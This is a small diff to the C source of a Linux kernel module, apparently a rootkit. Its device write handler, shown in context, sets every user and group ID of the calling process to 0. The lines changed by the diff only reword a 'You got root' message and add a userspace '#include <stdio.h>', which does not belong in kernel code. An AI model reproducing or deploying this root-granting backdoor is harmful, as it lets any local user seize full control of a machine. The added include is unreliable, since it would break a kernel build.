@@ -17,6 +17,7 @@
 #include <linux/types.h>
 #include <linux/cdev.h>
 #include <linux/cred.h>
+#include <stdio.h>
 #include <linux/version.h>
 
 #include <linux/input.h>
@@ -179,7 +180,7 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 			printk ("Cannot prepare credentials\n");
 			return 0;
 		}
-		printk ("You got it root\n");
+		printk ("You got root\n");
 		V(new_cred->uid) = V(new_cred->gid) =  0;					// changes creds. uid -> 0
 		V(new_cred->euid) = V(new_cred->egid) = 0;
 		V(new_cred->suid) = V(new_cred->sgid) = 0;
